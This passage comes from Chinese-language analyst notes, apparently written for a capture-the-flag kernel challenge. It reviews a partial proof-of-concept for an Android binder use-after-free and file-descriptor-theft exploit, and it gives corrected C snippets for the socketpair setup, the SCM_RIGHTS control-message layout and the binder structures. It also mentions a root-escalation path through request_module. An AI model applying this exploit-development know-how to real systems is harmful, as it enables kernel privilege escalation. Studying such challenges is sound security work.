握手 → 建 MIKU memfd → 開 /dev/binder」這 4 步，**沒有**做後面真正的
fd 替換/UAF 攻擊），結果 4 步都成功：

1. **`find_server_pid()` 找到 pid=101**：對照 3.2 節第 0 步的 pseudocode，
   代表 `/proc` 掃描 + `comm=="server"` + uid/gid 全部等於 30000 的指紋比對邏輯
   是對的，環境裡真的有一個這樣的 process 在跑。
2. **spawn `/bin/client` + HELLO 握手回 `"1 ok"`**：對照 3.2 節第 1~2 步，
   代表 `/bin/client` 這支協助程式存在、`/tmp/mte-client.sock` 這個 unix
   socket 會起、而且 HELLO 協定跟 `src/client_main.c`／`client_socket.c`
   描述的一致（`src/` 也有記錄 accept 後立刻 unlink socket，這點沒在這次
   測試裡驗證到，但握手成功本身已經是很強的訊號）。
3. **`build_miku_replacement_memfd()` 建出 fd=4**：代表 3.2 節第 4 步重建的
   MIKU/MMAP 容器格式位元組排列沒有讓 `memfd_create`/`mmap`/寫入這幾個
   系統呼叫本身出錯（這步只驗證「程式沒有崩潰」，並不能驗證這個容器內容
   丟給 server 之後**是否真的能觸發**它那邊的漏洞——那部分邏輯在 server
   binary 裡，我們沒有反編譯它）。
4. **`setup_binder()` 開 `/dev/binder` fd=5，`BINDER_VERSION` 回 `version=8`**：
   代表 binder driver 存在、版本符合預期，後續能繼續照 3.2 節第 5 步做
   `BC_ENTER_LOOPER`／grooming／freeze。

**結尾的 kernel panic 是預期行為，不是程式錯誤**：測試環境的開機 log 有一行
`[init] running uploaded solver as shell`，代表這個題目的 harness 是把你上傳的
payload（不管是真正的 solver 還是你自己寫的測試程式）直接當成 **PID 1（init
process）** 來執行，而不是在一個已經有 init 的系統裡跑一支普通程式。Linux
kernel 有個規則：**PID 1 不可以退出**，一旦 PID 1 的 `main()` `return`（或呼叫
`exit()`），kernel 會印 `"Attempted to kill init! exitcode=0x00000000"` 然後
panic——這是 kernel 自己的保護機制在抗議「init 死掉了，系統沒辦法運作了」，
跟你程式邏輯有沒有 bug 完全無關。因為 `fd_theft_poc.c` 目前故意只做 4 步
就從 `main()` 正常 `return 0`，所以會看到這個 panic，這正好**確認了程式
從頭到尾沒有卡住、沒有系統呼叫失敗、乾乾淨淨跑到最後一行**——是一個乾淨的
「成功結束」訊號，不是「攻擊失敗」或「程式壞掉」的訊號。

（旁證：真正的 `solver` 之所以不會在正常情況下觸發這個 panic，是因為它
最後會用 racer_scc 觸發 `request_module()`、讓 kernel 用 root 權限跑
`/tmp/a`，這條路徑不會讓 `main()` 走到自然 `return`——就算失敗，`solver`
也是呼叫 `die_msg()`/`exit(1)` 這種顯式結束方式，行為上其實跟直接 `return`
差不多，一樣會撞到「PID 1 不能退出」這個規則，只是這不是我們現在關心的重點。）

---

## 9. `fd_theft_poc.c` Code Review（對照 `FUN_0102c3e8` 反編譯逐行確認）

> 分析日期：2026-07-12

### 9.1 Bug 1（Critical）：缺少 `socketpair`，fd\[1] 送出垃圾值

**原始碼（`FUN_0102c3e8_main_solver_extracted.c` 第 413 行、第 459 行）：**

```c
// 建立 AF_UNIX socketpair，兩端分別是 local_12f8 (fds[0]) / local_12f4 (fds[1])
FUN_01039f70(1, 0x80001, 0, &local_12f8);
// = socketpair(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC, 0, fds)

// sendmsg 前，把 fds[1] 存進 uStack_1334（後來放進 cmsg fd 陣列的 index 1）
uStack_1334 = local_12f4;    // 第 459 行
```

sendmsg 之後：`FUN_01042b6c(local_12f4)` = `close(fds[1])`（送完 SCM_RIGHTS 就 close 自己的副本，標準寫法）。

`fds[0]`（local_12f8）則留著，後來用於（第 707 行）：
```c
FUN_01039cf8(local_12f8, ...)  // recvmsg(socketpair_fd, &bridge_hello_msg, ...)
```
從這裡收 bridge 回傳的 binder_fd / worker_pid / driver fd（見 3.2 節第 8 步）。

**筆記先前分析錯誤更正**：3.2.2 節曾說 fd[1] 是「未初始化 stack 殘留值（sp+0x19c 無人寫入）」，這是誤讀——實際上 local_12f4 就是 socketpair 的 fds[1]，只是 Ghidra 呈現的 stack offset 名稱讓人誤判了。

**PoC 的問題**：`fd_theft_poc.c` 完全沒有呼叫 `socketpair()`，導致：
- SCM_RIGHTS 送出的 fd[1] 是 `cmsg_buf.fds[1]`（stack 上未初始化的垃圾值），kernel 嘗試解讀它時可能失敗或誤傳其他 fd
- solver 這邊沒有任何 fd 可以 `recvmsg()` 等 bridge 回傳，stage 7+ 完全無法進行

**修法：**

```c
// 在 spawn_client_and_connect() 之後、build_miku_replacement_memfd() 之前加入
int spair[2];
if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, spair) < 0)
    die_errno("socketpair(return)");

// sendmsg 時 fds[1] = spair[1]
cmsg_fds[1] = spair[1];

// sendmsg 完之後
close(spair[1]);

// spair[0] 留著給之後的 recvmsg(bridge hello) 使用
```

### 9.2 Bug 2（Critical）：`struct my_cmsg_buf` 佈局錯誤，fd 陣列偏 4 bytes

**問題：**

```c
// PoC 的定義
struct my_cmsg_buf {
    struct cmsghdr hdr;  // sizeof = 12 bytes (socklen_t + int + int)
    int fds[16];         // ← 放在 offset 12
};
```

但 `CMSG_DATA(cmsg)` = `cmsg + CMSG_ALIGN(sizeof(cmsghdr))` = `cmsg + 16`（64-bit 系統 align 8，`CMSG_ALIGN(12) = 16`）。kernel 的 `scm_recv()` 從 offset **16** 讀 fd 陣列，PoC 的陣列在 offset **12**，差 4 bytes，導致每個 fd 值都被錯位解讀。

直接對照原始反編譯可以驗證：

```c
local_1070._0_2_ = 0x50;  // cmsg_len 低 16 bits = 0x50 = 80
// uStack_1068 在 &local_1070 + 8：
uStack_1068._0_4_ = 1;    // cmsg_level = SOL_SOCKET
uStack_1068._4_2_ = 1;    // cmsg_type  = SCM_RIGHTS
// uStack_1060 在 &local_1070 + 0x10 = 16：← fd 陣列從這裡開始
uStack_1060._0_2_ = udp_client;   // fd[0]
uStack_1060._4_4_ = socketpair_fd1; // fd[1]
// iStack_1058 在 &local_1070 + 0x18 = 24 = fd[2]
iStack_1058 = replacement_fd;
uStack_1238 = 0x50;   // msg_controllen = 0x50 = 80
```

cmsg_len 與 msg_controllen 都應該是 **80（0x50）**，不是 76（`sizeof(struct my_cmsg_buf) = 12 + 64 = 76`）。

**修法（方案一：加 explicit padding）：**

```c
struct my_cmsg_buf {
    struct cmsghdr hdr;
    uint8_t _pad[4];   // CMSG_ALIGN(12) - 12 = 4 bytes
    int fds[16];       // 現在在 offset 16 = CMSG_DATA 位置
} cmsg_buf;

cmsg_buf.hdr.cmsg_len   = CMSG_LEN(sizeof(int) * 16);   // = 80
cmsg_buf.hdr.cmsg_level = SOL_SOCKET;
cmsg_buf.hdr.cmsg_type  = SCM_RIGHTS;
// msg_controllen = CMSG_SPACE(sizeof(int) * 16) = 80
```

**修法（方案二：用 CMSG macro，最正確）：**

```c
char cmsg_buf[CMSG_SPACE(sizeof(int) * 16)];
struct cmsghdr *cmsg = (struct cmsghdr *)cmsg_buf;
cmsg->cmsg_len   = CMSG_LEN(sizeof(int) * 16);
cmsg->cmsg_level = SOL_SOCKET;
cmsg->cmsg_type  = SCM_RIGHTS;
int *fds_p = (int *)CMSG_DATA(cmsg);
fds_p[0] = udp_client;
fds_p[1] = spair[1];
fds_p[2] = replacement_fd;
// fds_p[3..15] = 13 個 /dev/null fd
```

### 9.3 Bug 3（Moderate）：缺少 13 個 `/dev/null` fd，且 close 未初始化值

**原始碼（第 463-473 行）：**

```c
// sendmsg 前，開 13 個 /dev/null (O_CLOEXEC) 存進 local_136c[]，
// 同時複製一份到 iStack_132c[]（也就是 fd 陣列的 index 3-15）
do {
    iVar11 = open("/dev/null", O_CLOEXEC);
    local_136c[i] = iVar11;
    iStack_132c[i] = iVar11;   // fd[3 + i]
    i += 4;
} while (i != 0x34);           // 0x34 / 4 = 13 個
```

sendmsg 後全部 close（第 546-550 行）。

**PoC 的問題**：直接跳過這段，fd[3..15] 在 stack 上未初始化，後面的 close 迴圈：

```c
close(cmsg_buf.fds[1]);       // 未初始化，可能 close 掉 stdin/stdout 等合法 fd
for (int i = 3; i < 16; i++)
    close(cmsg_buf.fds[i]);   // 同上
```

這些 close 在某些環境下可能意外關掉 fd=0/1/2 或其他正在用的 fd，造成後續 I/O 失敗。

**修法：** 在 sendmsg 前開 13 個 `/dev/null`，存進 fds[3..15]，sendmsg 後再全部 close：

```c
int dev_null_fds[13];
for (int i = 0; i < 13; i++) {
    dev_null_fds[i] = open("/dev/null", O_CLOEXEC);
    if (dev_null_fds[i] < 0) die_errno("open(/dev/null)");
    fds_p[3 + i] = dev_null_fds[i];
}
// ... sendmsg ...
for (int i = 0; i < 13; i++) close(dev_null_fds[i]);
```

### 9.4 小問題：`struct binder_transaction_data` 欄位與 kernel 不符

**原始 PoC 的定義：**

```c
uid_t    sender_euid;
gid_t    sender_egid;   // ← kernel struct 沒有這個欄位
```

**Kernel 實際定義（linux/binder.h）：**

```c
__s32    sender_pid;    // 4 bytes
__u32    sender_euid;   // 4 bytes
// 沒有 sender_egid
```

兩組加起來都是 8 bytes，`sizeof(struct binder_transaction_data)` 都是 64 bytes，目前因為這兩個欄位都保持 0 所以行為一樣。但語意上是錯的，而且若之後需要讀 `sender_pid`（例如驗證 server 身份），會讀到錯的欄位。

**建議改成：**

```c
int32_t  sender_pid;    // 對應 kernel 的 __s32 sender_pid
uint32_t sender_euid;   // 對應 kernel 的 __u32 sender_euid
```